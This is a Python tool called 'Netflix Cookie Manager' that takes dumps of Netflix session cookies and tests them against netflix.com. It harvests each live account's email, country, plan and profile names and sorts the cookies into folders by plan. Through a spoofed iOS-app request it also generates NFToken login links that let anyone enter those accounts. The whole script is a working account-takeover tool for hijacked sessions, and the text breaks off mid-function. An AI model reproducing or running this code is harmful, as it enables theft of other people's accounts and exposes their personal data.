#!/usr/bin/env python3
"""
Netflix Cookie Manager - v3.4.1
By: Anshoo Singh 
+ Option 2: TV2 Login + NFToken Generator
+ 'all' = select all files in current folder
+ Back option (0)
+ Filename: email-mon-dd.txt format
"""

import os
import sys
import re
import json
import random
import string
import time
import html
import unicodedata
from urllib.parse import unquote, urlencode
from datetime import datetime
from typing import Dict, Optional, List, Tuple

try:
    import requests
except ImportError:
    print("⚠️ requests not installed! Installing...")
    os.system("pip install requests")
    import requests

from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# ==================== CONSTANTS ====================

VERSION = "3.4.1"
AUTHOR = "Anshoo Singh"
BASE_PATH = "/storage/emulated/0/Download/cookies"
ALIVE_PATH = os.path.join(BASE_PATH, "alive")
NFTOKEN_PATH = os.path.join(BASE_PATH, "NFToken")

PLAN_FOLDERS = {
    'premium': os.path.join(ALIVE_PATH, 'Premium'),
    'standard': os.path.join(ALIVE_PATH, 'Standard'),
    'standard_with_ads': os.path.join(ALIVE_PATH, 'Standard_With_Ads'),
    'basic': os.path.join(ALIVE_PATH, 'Basic'),
    'mobile': os.path.join(ALIVE_PATH, 'Mobile'),
    'free': os.path.join(ALIVE_PATH, 'Free'),
    'unknown': os.path.join(ALIVE_PATH, 'Unknown'),
}

for folder in [BASE_PATH, ALIVE_PATH, NFTOKEN_PATH] + list(PLAN_FOLDERS.values()):
    os.makedirs(folder, exist_ok=True)

NETFLIX_COOKIE_PATTERN = r'\.netflix\.com\s+TRUE\s+/\s+(?:TRUE|FALSE)\s+\d+\s+(NetflixId|SecureNetflixId|OptanonConsent)\s+([^\s]+)'

MONTH_SHORT = {
    1: 'jan', 2: 'feb', 3: 'mar', 4: 'apr', 5: 'may', 6: 'jun',
    7: 'jul', 8: 'aug', 9: 'sep', 10: 'oct', 11: 'nov', 12: 'dec'
}

# NFToken API Details
NFTOKEN_API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48.1"
NFTOKEN_QUERY_PARAMS = {
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "en-US",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "IPHONE8-1",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "flat",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
    "shellVersion": "15.48.1",
    "style": "json",
    "uiVersion": "15.48.1",
    "userId": "",
    "version": "15.48.1",
}

NFTOKEN_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "ios",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1.0",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Kolkata",
}

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    END = '\033[0m'
    GRAY = '\033[90m'
    WHITE = '\033[97m'

# ==================== NETFLIX COOKIE EXTRACTOR ====================

class NetflixCookieExtractor:
    def extract_from_text(self, content: str, verbose: bool = True) -> Optional[Dict]:
        cookies = {}
        lines = content.splitlines()
        
        for line in lines:
            line = line.strip()
            if not line or '.netflix.com' not in line:
                continue
            
            match = re.search(NETFLIX_COOKIE_PATTERN, line)
            if match:
                cookie_name = match.group(1)
                cookie_value = match.group(2).strip()
                
                if cookie_name == 'NetflixId':
                    cookies['NetflixId'] = cookie_value
                elif cookie_name == 'SecureNetflixId':
                    cookies['SecureNetflixId'] = cookie_value
                elif cookie_name == 'OptanonConsent':
                    cookies['OptanonConsent'] = cookie_value
        
        return cookies if cookies.get('NetflixId') else None

# ==================== UNIVERSAL DATE PARSER ====================

class UniversalDateParser:
    MONTHS = {
        'january': 1, 'february': 2, 'march': 3, 'april': 4, 'may': 5, 'june': 6,
        'july': 7, 'august': 8, 'september': 9, 'october': 10, 'november': 11, 'december': 12,
        'jan': 1, 'feb': 2, 'mar': 3, 'apr': 4, 'jun': 6, 'jul': 7, 'aug': 8,
        'sep': 9, 'sept': 9, 'oct': 10, 'nov': 11, 'dec': 12,
        'enero': 1, 'febrero': 2, 'marzo': 3, 'abril': 4, 'mayo': 5, 'junio': 6,
        'julio': 7, 'agosto': 8, 'septiembre': 9, 'octubre': 10, 'noviembre': 11, 'diciembre': 12,
        'janeiro': 1, 'fevereiro': 2, 'março': 3, 'abril': 4, 'maio': 5, 'junho': 6,
        'julho': 7, 'agosto': 8, 'setembro': 9, 'outubro': 10, 'novembro': 11, 'dezembro': 12,
        'janvier': 1, 'février': 2, 'mars': 3, 'avril': 4, 'mai': 5, 'juin': 6,
        'juillet': 7, 'août': 8, 'septembre': 9, 'octobre': 10, 'novembre': 11, 'décembre': 12,
        'januar': 1, 'februar': 2, 'märz': 3, 'april': 4, 'mai': 5, 'juni': 6,
        'juli': 7, 'august': 8, 'september': 9, 'oktober': 10, 'november': 11, 'dezember': 12,
        'gennaio': 1, 'febbraio': 2, 'marzo': 3, 'aprile': 4, 'maggio': 5, 'giugno': 6,
        'luglio': 7, 'agosto': 8, 'settembre': 9, 'ottobre': 10, 'novembre': 11, 'dicembre': 12,
        'januari': 1, 'februari': 2, 'maart': 3, 'april': 4, 'mei': 5, 'juni': 6,
        'juli': 7, 'augustus': 8, 'september': 9, 'oktober': 10, 'november': 11, 'december': 12,
        '1월': 1, '2월': 2, '3월': 3, '4월': 4, '5월': 5, '6월': 6,
        '7월': 7, '8월': 8, '9월': 9, '10월': 10, '11월': 11, '12월': 12,
        '1月': 1, '2月': 2, '3月': 3, '4月': 4, '5月': 5, '6月': 6,
        '7月': 7, '8月': 8, '9月': 9, '10月': 10, '11月': 11, '12月': 12,
        '一月': 1, '二月': 2, '三月': 3, '四月': 4, '五月': 5, '六月': 6,
        '七月': 7, '八月': 8, '九月': 9, '十月': 10, '十一月': 11, '十二月': 12,
        'январь': 1, 'февраль': 2, 'март': 3, 'апрель': 4, 'май': 5, 'июнь': 6,
        'июль': 7, 'август': 8, 'сентябрь': 9, 'октябрь': 10, 'ноябрь': 11, 'декабрь': 12,
        'ocak': 1, 'şubat': 2, 'mart': 3, 'nisan': 4, 'mayıs': 5, 'haziran': 6,
        'temmuz': 7, 'ağustos': 8, 'eylül': 9, 'ekim': 10, 'kasım': 11, 'aralık': 12,
        'يناير': 1, 'فبراير': 2, 'مارس': 3, 'أبريل': 4, 'مايو': 5, 'يونيو': 6,
        'يوليو': 7, 'أغسطس': 8, 'سبتمبر': 9, 'أكتوبر': 10, 'نوفمبر': 11, 'ديسمبر': 12,
        'जनवरी': 1, 'फरवरी': 2, 'मार्च': 3, 'अप्रैल': 4, 'मई': 5, 'जून': 6,
        'जुलाई': 7, 'अगस्त': 8, 'सितंबर': 9, 'अक्टूबर': 10, 'नवंबर': 11, 'दिसंबर': 12,
        'januar': 1, 'februar': 2, 'marts': 3, 'april': 4, 'maj': 5, 'juni': 6,
        'juli': 7, 'august': 8, 'september': 9, 'oktober': 10, 'november': 11, 'december': 12,
        'siječanj': 1, 'veljača': 2, 'ožujak': 3, 'travanj': 4, 'svibanj': 5, 'lipanj': 6,
        'srpanj': 7, 'kolovoz': 8, 'rujan': 9, 'listopad': 10, 'studeni': 11, 'prosinac': 12,
        'enero': 1, 'pebrero': 2, 'marso': 3, 'abril': 4, 'mayo': 5, 'hunyo': 6,
        'hulyo': 7, 'agosto': 8, 'setyembre': 9, 'oktubre': 10, 'nobyembre': 11, 'disyembre': 12,
        'január': 1, 'február': 2, 'március': 3, 'április': 4, 'május': 5, 'június': 6,
        'július': 7, 'augusztus': 8, 'szeptember': 9, 'október': 10, 'november': 11, 'december': 12,
        'januari': 1, 'februari': 2, 'mac': 3, 'april': 4, 'mei': 5, 'jun': 6,
        'julai': 7, 'ogos': 8, 'september': 9, 'oktober': 10, 'november': 11, 'disember': 12,
        'januar': 1, 'februar': 2, 'mars': 3, 'april': 4, 'mai': 5, 'juni': 6,
        'juli': 7, 'august': 8, 'september': 9, 'oktober': 10, 'november': 11, 'desember': 12,
        'styczeń': 1, 'luty': 2, 'marzec': 3, 'kwiecień': 4, 'maj': 5, 'czerwiec': 6,
        'lipiec': 7, 'sierpień': 8, 'wrzesień': 9, 'październik': 10, 'listopad': 11, 'grudzień': 12,
        'ianuarie': 1, 'februarie': 2, 'martie': 3, 'aprilie': 4, 'mai': 5, 'iunie': 6,
        'iulie': 7, 'august': 8, 'septembrie': 9, 'octombrie': 10, 'noiembrie': 11, 'decembrie': 12,
        'tammikuu': 1, 'helmikuu': 2, 'maaliskuu': 3, 'huhtikuu': 4, 'toukokuu': 5, 'kesäkuu': 6,
        'heinäkuu': 7, 'elokuu': 8, 'syyskuu': 9, 'lokakuu': 10, 'marraskuu': 11, 'joulukuu': 12,
        'januari': 1, 'februari': 2, 'mars': 3, 'april': 4, 'maj': 5, 'juni': 6,
        'juli': 7, 'augusti': 8, 'september': 9, 'oktober': 10, 'november': 11, 'december': 12,
        'tháng 1': 1, 'tháng 2': 2, 'tháng 3': 3, 'tháng 4': 4, 'tháng 5': 5, 'tháng 6': 6,
        'tháng 7': 7, 'tháng 8': 8, 'tháng 9': 9, 'tháng 10': 10, 'tháng 11': 11, 'tháng 12': 12,
        'leden': 1, 'únor': 2, 'březen': 3, 'duben': 4, 'květen': 5, 'červen': 6,
        'červenec': 7, 'srpen': 8, 'září': 9, 'říjen': 10, 'listopad': 11, 'prosinec': 12,
        'ιανουάριος': 1, 'φεβρουάριος': 2, 'μάρτιος': 3, 'απρίλιος': 4, 'μάιος': 5, 'ιούνιος': 6,
        'ιούλιος': 7, 'αύγουστος': 8, 'σεπτέμβριος': 9, 'οκτώβριος': 10, 'νοέμβριος': 11, 'δεκέμβριος': 12,
        'січень': 1, 'лютий': 2, 'березень': 3, 'квітень': 4, 'травень': 5, 'червень': 6,
        'липень': 7, 'серпень': 8, 'вересень': 9, 'жовтень': 10, 'листопад': 11, 'грудень': 12,
        'ژانویه': 1, 'فوریه': 2, 'مارس': 3, 'آوریل': 4, 'مه': 5, 'ژوئن': 6,
        'ژوئیه': 7, 'اوت': 8, 'سپتامبر': 9, 'اکتبر': 10, 'نوامبر': 11, 'دسامبر': 12,
        'جنوری': 1, 'فروری': 2, 'مارچ': 3, 'اپریل': 4, 'مئی': 5, 'جون': 6,
        'جولائی': 7, 'اگست': 8, 'ستمبر': 9, 'اکتوبر': 10, 'نومبر': 11, 'دسمبر': 12,
        'มกราคม': 1, 'กุมภาพันธ์': 2, 'มีนาคม': 3, 'เมษายน': 4, 'พฤษภาคม': 5, 'มิถุนายน': 6,
        'กรกฎาคม': 7, 'สิงหาคม': 8, 'กันยายน': 9, 'ตุลาคม': 10, 'พฤศจิกายน': 11, 'ธันวาคม': 12,
        'ມັງກອນ': 1, 'ກຸມພາ': 2, 'ມີນາ': 3, 'ເມສາ': 4, 'ພຶດສະພາ': 5, 'ມິຖຸນາ': 6,
        'ກໍລະກົດ': 7, 'ສິງຫາ': 8, 'ກັນຍາ': 9, 'ຕຸລາ': 10, 'ພະຈິກ': 11, 'ທັນວາ': 12,
    }
    
    @staticmethod
    def parse_date(date_str: str) -> Optional[str]:
        if not date_str:
            return None
        
        date_str = str(date_str).strip()
        
        match = re.search(r'(\d{4})-(\d{2})-(\d{2})', date_str)
        if match:
            year, month, day = match.groups()
            months = ['January', 'February', 'March', 'April', 'May', 'June',
                     'July', 'August', 'September', 'October', 'November', 'December']
            try:
                return f"{months[int(month)-1]} {int(day)}"
            except:
                return f"{month}/{day}"
        
        date_lower = date_str.lower()
        
        for month_name, month_num in UniversalDateParser.MONTHS.items():
            if month_name in date_lower:
                year_match = re.search(r'(\d{4})', date_str)
                if year_match:
                    months_en = ['January', 'February', 'March', 'April', 'May', 'June',
                                'July', 'August', 'September', 'October', 'November', 'December']
                    month_en = months_en[month_num - 1]
                    
                    day_match = re.search(r'(\d{1,2})', date_str.replace(year_match.group(1), ''))
                    if day_match:
                        day = int(day_match.group(1))
                        return f"{month_en} {day}"
                    return f"{month_en}"
        
        numbers = re.findall(r'\d+', date_str)
        if len(numbers) >= 3:
            if int(numbers[0]) <= 12 and int(numbers[1]) <= 31:
                month = int(numbers[0])
                day = int(numbers[1])
                if 1 <= month <= 12 and 1 <= day <= 31:
                    months = ['January', 'February', 'March', 'April', 'May', 'June',
                             'July', 'August', 'September', 'October', 'November', 'December']
                    return f"{months[month-1]} {day}"
        
        return UniversalDateParser._clean_date(date_str)
    
    @staticmethod
    def parse_date_raw(date_str: str) -> Optional[Tuple[int, int]]:
        if not date_str:
            return None
        
        date_str = str(date_str).strip()
        
        match = re.search(r'(\d{4})-(\d{2})-(\d{2})', date_str)
        if match:
            year, month, day = match.groups()
            try:
                return (int(month), int(day))
            except:
                return None
        
        date_lower = date_str.lower()
        
        for month_name, month_num in UniversalDateParser.MONTHS.items():
            if month_name in date_lower:
                year_match = re.search(r'(\d{4})', date_str)
                if year_match:
                    day_match = re.search(r'(\d{1,2})', date_str.replace(year_match.group(1), ''))
                    if day_match:
                        return (month_num, int(day_match.group(1)))
                    return (month_num, 1)
        
        numbers = re.findall(r'\d+', date_str)
        if len(numbers) >= 3:
            if int(numbers[0]) <= 12 and int(numbers[1]) <= 31:
                month = int(numbers[0])
                day = int(numbers[1])
                if 1 <= month <= 12 and 1 <= day <= 31:
                    return (month, day)
        
        return None
    
    @staticmethod
    def _clean_date(text: str) -> str:
        text = str(text)
        text = text.replace('de', '')
        text = text.replace('of', '')
        text = text.replace(',', '')
        text = text.replace('.', '')
        text = text.replace('/', ' ')
        text = text.replace('-', ' ')
        text = re.sub(r'\s+', ' ', text).strip()
        text = re.sub(r'\b\d{4}\b', '', text).strip()
        return text

# ==================== EXACT FIELDS EXTRACTOR ====================

class ExactDetailsExtractor:
    def __init__(self):
        self.date_parser = UniversalDateParser()
    
    def extract_details(self, html: str) -> Dict:
        details = {
            'email': '',
            'country': '',
            'member_since': '',
            'member_since_raw': None,
            'streams': '',
            'plan_name': ''
        }
        
        json_match = re.search(r'<script id="reactContainer" type="application/json">([^<]+)</script>', html)
        if json_match:
            try:
                data = json.loads(json_match.group(1))
                account = data.get('data', {}).get('growthAccount', {})
                
                if account:
                    if account.get('email'):
                        details['email'] = self._clean(account['email'])
                    elif account.get('emailAddress'):
                        details['email'] = self._clean(account['emailAddress'])
                    elif account.get('loginId'):
                        details['email'] = self._clean(account['loginId'])
                    
                    if account.get('countryOfSignup'):
                        details['country'] = self._clean(account['countryOfSignup'])
                    elif account.get('country'):
                        details['country'] = self._clean(account['country'])
                    
                    if account.get('memberSince'):
                        details['member_since'] = self.date_parser.parse_date(account['memberSince'])
                        details['member_since_raw'] = self.date_parser.parse_date_raw(account['memberSince'])
                    
                    current_plan = account.get('currentPlan', {}).get('plan', {})
                    next_plan = account.get('nextPlan', {}).get('plan', {})
                    
                    if current_plan.get('maxStreams'):
                        details['streams'] = str(current_plan['maxStreams'])
                    elif next_plan.get('maxStreams'):
                        details['streams'] = str(next_plan['maxStreams'])
                    
                    streams = details.get('streams', '')
                    if streams == '4':
                        details['plan_name'] = 'Premium'
                    elif streams == '2':
                        details['plan_name'] = 'Standard'
                    elif streams == '1':
                        details['plan_name'] = 'Basic'
                    else:
                        if current_plan.get('name'):
                            details['plan_name'] = self._clean(current_plan['name'])
                        elif current_plan.get('localizedPlanName'):
                            details['plan_name'] = self._clean(current_plan['localizedPlanName'])
                        elif next_plan.get('name'):
                            details['plan_name'] = self._clean(next_plan['name'])
                        elif next_plan.get('localizedPlanName'):
                            details['plan_name'] = self._clean(next_plan['localizedPlanName'])
                            
            except Exception as e:
                pass
        
        if not details['member_since']:
            match = re.search(r'"memberSince":"([^"]+)"', html)
            if match:
                details['member_since'] = self.date_parser.parse_date(match.group(1))
                details['member_since_raw'] = self.date_parser.parse_date_raw(match.group(1))
            else:
                patterns = [
                    r'Member Since:\s*([^\n<]+)',
                    r'Miembro desde:\s*([^\n<]+)',
                    r'Assinante desde:\s*([^\n<]+)',
                    r'Membre depuis:\s*([^\n<]+)',
                    r'Mitglied seit:\s*([^\n<]+)',
                    r'Membro dal:\s*([^\n<]+)',
                    r'Lid sinds:\s*([^\n<]+)',
                    r'Anggota sejak:\s*([^\n<]+)',
                    r'メンバーシップ開始:\s*([^\n<]+)',
                    r'멤버십 시작:\s*([^\n<]+)',
                    r'会员起始日期:\s*([^\n<]+)',
                    r'Участник с:\s*([^\n<]+)',
                    r'Üyelik başlangıcı:\s*([^\n<]+)',
                ]
                for pattern in patterns:
                    match = re.search(pattern, html, re.IGNORECASE)
                    if match:
                        details['member_since'] = self.date_parser.parse_date(match.group(1))
                        details['member_since_raw'] = self.date_parser.parse_date_raw(match.group(1))
                        break
        
        if not details['email']:
            match = re.search(r'"email":"([^"]+)"', html)
            if match:
                details['email'] = self._clean(match.group(1))
            else:
                match = re.search(r'"emailAddress":"([^"]+)"', html)
                if match:
                    details['email'] = self._clean(match.group(1))
        
        if not details['country']:
            match = re.search(r'"countryOfSignup":"([^"]+)"', html)
            if match:
                details['country'] = self._clean(match.group(1))
            else:
                match = re.search(r'"country":"([^"]+)"', html)
                if match:
                    details['country'] = self._clean(match.group(1))
        
        if not details['streams']:
            match = re.search(r'"maxStreams":([0-9]+)', html)
            if match:
                details['streams'] = match.group(1)
        
        if not details['plan_name']:
            streams = details.get('streams', '')
            if streams == '4':
                details['plan_name'] = 'Premium'
            elif streams == '2':
                details['plan_name'] = 'Standard'
            elif streams == '1':
                details['plan_name'] = 'Basic'
            else:
                match = re.search(r'"localizedPlanName":"([^"]+)"', html)
                if match:
                    details['plan_name'] = self._clean(match.group(1))
                else:
                    match = re.search(r'"planName":"([^"]+)"', html)
                    if match:
                        details['plan_name'] = self._clean(match.group(1))
        
        return details
    
    def extract_profiles(self, html: str) -> List[str]:
        profiles = []
        json_match = re.search(r'<script id="reactContainer" type="application/json">([^<]+)</script>', html)
        if json_match:
            try:
                data = json.loads(json_match.group(1))
                profiles_data = data.get('data', {}).get('profiles', [])
                if not profiles_data:
                    profiles_data = data.get('profiles', [])
                for profile in profiles_data:
                    name = profile.get('name') or profile.get('profileName') or profile.get('firstName')
                    if name:
                        profiles.append(name)
            except:
                pass
        
        if not profiles:
            matches = re.findall(r'"profileName":"([^"]+)"', html)
            if not matches:
                matches = re.findall(r'"name":"([^"]+)"', html)
            if not matches:
                matches = re.findall(r'<span[^>]*class="[^"]*profile-name[^"]*"[^>]*>([^<]+)</span>', html, re.IGNORECASE)
            if not matches:
                matches = re.findall(r'data-profile-name="([^"]+)"', html)
            profiles = matches
        
        profiles = list(dict.fromkeys(profiles))
        return profiles
    
    def _clean(self, text: str) -> str:
        if not text:
            return ''
        text = str(text)
        
        try:
            text = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), text)
            text = re.sub(r'\\u([0-9a-fA-F]{4})', lambda m: chr(int(m.group(1), 16)), text)
            text = re.sub(r'\\U([0-9a-fA-F]{8})', lambda m: chr(int(m.group(1), 16)), text)
        except:
            pass
        
        try:
            text = html.unescape(text)
        except:
            pass
        
        try:
            text = unquote(text)
        except:
            pass
        
        replacements = {
            '\\x20': ' ', '\\x40': '@', '\\x2E': '.', '\\x2D': '-', '\\x5F': '_',
            '\\x2F': '/', '\\x3A': ':', '\\x3B': ';', '\\x3D': '=', '\\x3F': '?',
            '\\x26': '&', '\\x23': '#', '\\x7E': '~', '\\x2C': ',', '\\x22': '"',
            '\\x27': "'", '\\x5C': '\\', '\\n': ' ', '\\r': ' ', '\\t': ' ',
            '\\"': '"', "\\'": "'", '\\/': '/', '\\u00A0': ' ', '\\u00a0': ' ',
        }
        for old, new in replacements.items():
            text = text.replace(old, new)
        
        text = re.sub(r'\s+', ' ', text).strip()
        
        if text.startswith('{') or text.startswith('['):
            return ''
        
        text = ''.join(char for char in text if ord(char) >= 32 or char in '\n\r\t')
        
        return text.strip()

# ==================== COOKIE CHECKER ====================

class CookieChecker:
    def __init__(self):
        self.timeout = 20
        self.max_retries = 2
        self.stats = {
            'total': 0,
            'alive': 0,
            'dead': 0,
            'errors': 0,
            'plans': {}
        }
        self.extractor = NetflixCookieExtractor()
        self.details_extractor = ExactDetailsExtractor()
        self.date_parser = UniversalDateParser()
    
    def check_cookie(self, cookies: Dict) -> Tuple[bool, Optional[str], Optional[Dict]]:
        if not cookies or 'NetflixId' not in cookies:
            return False, None, None
        
        for attempt in range(self.max_retries):
            try:
                session = requests.Session()
                
                if cookies.get('NetflixId'):
                    session.cookies.set('NetflixId', cookies['NetflixId'], domain='.netflix.com', path='/')
                if cookies.get('SecureNetflixId'):
                    session.cookies.set('SecureNetflixId', cookies['SecureNetflixId'], domain='.netflix.com', path='/')
                
                response = session.get(
                    'https://www.netflix.com/browse',
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=False
                )
                
                if response.status_code != 200:
                    if attempt < self.max_retries - 1:
                        time.sleep(1)
                        continue
                    return False, None, None
                
                response = session.get(
                    'https://www.netflix.com/account/membership',
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=True
                )
                
                if response.status_code != 200:
                    if attempt < self.max_retries - 1:
                        time.sleep(1)
                        continue
                    return False, None, None
                
                details = self.details_extractor.extract_details(response.text)
                
                try:
                    profiles_response = session.get(
                        'https://www.netflix.com/manageprofiles',
                        timeout=self.timeout,
                        verify=False,
                        allow_redirects=True
                    )
                    if profiles_response.status_code == 200:
                        profiles = self.details_extractor.extract_profiles(profiles_response.text)
                        details['profiles'] = [self.details_extractor._clean(p) for p in profiles]
                    else:
                        details['profiles'] = []
                except:
                    details['profiles'] = []
                
                member_since = details.get('member_since', '')
                
                if member_since and member_since != 'N/A' and member_since != '':
                    plan = self._detect_plan(response.text, details)
                    return True, plan, details
                
                plan = self._detect_plan(response.text, details)
                return True, plan, details
                
            except Exception:
                if attempt < self.max_retries - 1:
                    time.sleep(1)
                    continue
                return False, None, None
        
        return False, None, None
    
    def _detect_plan(self, html: str, details: Dict) -> str:
        streams = details.get('streams', '')
        if streams == '4':
            return 'premium'
        elif streams == '2':
            return 'standard'
        elif streams == '1':
            return 'basic'
        
        if details and details.get('plan_name'):
            plan_text = details['plan_name'].lower()
            if 'premium' in plan_text:
                return 'premium'
            elif 'standard' in plan_text and 'ads' in plan_text:
                return 'standard_with_ads'
            elif 'standard' in plan_text:
                return 'standard'
            elif 'basic' in plan_text:
                return 'basic'
            elif 'mobile' in plan_text:
                return 'mobile'
        
        html_lower = html.lower()
        if 'premium' in html_lower or '4k' in html_lower:
            return 'premium'
        elif 'standard with ads' in html_lower:
            return 'standard_with_ads'
        elif 'standard' in html_lower:
            return 'standard'
        elif 'basic' in html_lower:
            return 'basic'
        elif 'mobile' in html_lower:
            return 'mobile'
        
        return 'unknown'

# ==================== NFToken GENERATOR ====================

class NFTokenGenerator:
    def __init__(self):
        self.timeout = 20
    
    def get_nftoken(self, cookies: Dict) -> Optional[str]:
        try:
            session = requests.Session()
            
            for name, value in cookies.items():
                session.cookies.set(name, value, domain='.netflix.com', path='/')
            
            netflix_id = session.cookies.get('NetflixId', domain='.netflix.com')
            if netflix_id and '%' in netflix_id:
                session.cookies.set('NetflixId', unquote(netflix_id), domain='.netflix.com')
            
            session.headers.update(NFTOKEN_HEADERS)
            
            user_id = self._get_user_id(session)
            if not user_id:
                user_id = ""
            
            params = dict(NFTOKEN_QUERY_PARAMS)
            params['userId'] = user_id
            
            r = session.get(
                NFTOKEN_API_URL,
                params=params,
                timeout=self.timeout,
                verify=False
            )
            
            if r.status_code != 200:
                return None
            
            try:
                data = r.json()
                token_data = data.get('value', {}).get('account', {}).get('token', {}).get('default', {})
                token = token_data.get('token')
                if token:
                    return token
            except:
                pass
            
            try:
                data = r.json()
                if isinstance(data, dict):
                    paths = [
                        ['value', 'account', 'token', 'default', 'token'],
                        ['account', 'token', 'default', 'token'],
                        ['token', 'default', 'token'],
                        ['nftoken'],
                    ]
                    for path in paths:
                        val = data
                        for key in path:
                            if isinstance(val, dict):
                                val = val.get(key)
                            else:
                                val = None
                                break
                        if val and isinstance(val, str) and len(val) > 20:
                            return val
            except:
                pass
            
            return None
            
        except Exception as e:
            return None
    
    def _get_user_id(self, session: requests.Session) -> Optional[str]:
        try:
            r = session.get(
                'https://www.netflix.com/account/membership',
                timeout=self.timeout,
                verify=False
            )
            if r.status_code == 200:
                match = re.search(r'"userId":"([^"]+)"', r.text)
                if match:
                    return match.group(1)
                
                match = re.search(r'"accountOwnerId":"([^"]+)"', r.text)
                if match:
                    return match.group(1)
                
                match = re.search(r'"customerId":"([^"]+)"', r.text)
                if match:
                    return match.group(1)
        except:
            pass
        
        return None
    
    def generate_pc_link(self, token: str) -> str:
        return f"https://netflix.com/?nftoken={token}"
    
    def generate_mobile_link(self, token: str) -> str:
        return f"https://netflix.com/unsupported?nftoken={token}"
    
    def generate_tv_link(self, token: str) -> str:
        return f"https://netflix.com/tv2?nftoken={token}"
    
    def login_and_generate(self, cookies: Dict) -> Dict:
        result = {
            'success': False,
            'nftoken': None,
            'pc_link': None,
            'mobile_link': None,
            'tv_link': None,
            'error': None
        }
        
        try:
            session = requests.Session()
            for name, value in cookies.items():
                session.cookies.set(name, value, domain='.netflix.com', path='/')
            
            r = session.get(
                'https://www.netflix.com/browse',
                timeout=self.timeout,
                verify=False,
                allow_redirects=False
            )
            
            if r.status_code != 200:
                result['error'] = 'Login failed - cookies expired or invalid'
                return result
            
            token = self.get_nftoken(cookies)
            
            if token:
                result['success'] = True
                result['nftoken'] = token
                result['pc_link'] = self.generate_pc_link(token)
                result['mobile_link'] = self.generate_mobile_link(token)
                result['tv_link'] = self.generate_tv_link(token)
            else:
                result['error'] = 'Login successful but NFToken generation failed'
            
            return result
            
        except Exception as e:
            result['error'] = str(e)
            return result

# ==================== UI ====================

class UI:
    def __init__(self):
        self.extractor = NetflixCookieExtractor()
        self.checker = None
        self.token_generator = NFTokenGenerator()
        self.is_running = True
        
        for folder in [BASE_PATH, ALIVE_PATH, NFTOKEN_PATH] + list(PLAN_FOLDERS.values()):
            os.makedirs(folder, exist_ok=True)
    
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def print_header(self):
        print(f"{Colors.BOLD}{Colors.CYAN}{'='*60}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.GREEN}  🎬 NETFLIX COOKIE MANAGER v{VERSION}{Colors.END}")
        print(f"{Colors.WHITE}  By: {AUTHOR}{Colors.END}")
        print(f"{Colors.GRAY}  📁 Save: {BASE_PATH}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}{'='*60}{Colors.END}\n")
    
    def print_menu(self):
        self.print_header()
        print(f"{Colors.BOLD}{Colors.YELLOW}📋 MAIN MENU{Colors.END}")
        print(f"{Colors.GRAY}{'─'*60}{Colors.END}")
        print(f"  {Colors.GREEN}1.{Colors.END} 🚀 EXTRACT + CHECK")
        print(f"  {Colors.GREEN}2.{Colors.END} 🔗 TV2 LOGIN + NFToken GENERATOR")
        print(f"  {Colors.RED}0.{Colors.END} 🚪 Exit")
        print(f"{Colors.GRAY}{'─'*60}{Colors.END}")
    
    def run(self):
        while self.is_running:
            self.clear_screen()
            self.print_menu()
            
            choice = input(f"\n{Colors.YELLOW}👉 Enter choice: {Colors.END}").strip()
            
            if choice == '1':
                self.extract_and_check()
            elif choice == '2':
                self.tv2_login()
            elif choice == '0':
                self.exit_app()
            else:
                print(f"{Colors.RED}❌ Invalid!{Colors.END}")
                time.sleep(1)
    
    # ==================== FILE BROWSER WITH 'all' ====================
    
    def browse_for_file(self) -> Optional[List[str]]:
        """Browse for .txt files with subfolder navigation, back option, and 'all' command"""
        current_path = "/storage/emulated/0/Download"
        
        while True:
            self.clear_screen()
            self.print_header()
            
            print(f"{Colors.BOLD}{Colors.YELLOW}📄 Select .txt file:{Colors.END}")
            print(f"{Colors.GRAY}Current: {current_path}{Colors.END}")
            print(f"{Colors.GRAY}{'─'*60}{Colors.END}")
            
            folders = []
            files = []
            try:
                for item in sorted(os.listdir(current_path)):
                    full_path = os.path.join(current_path, item)
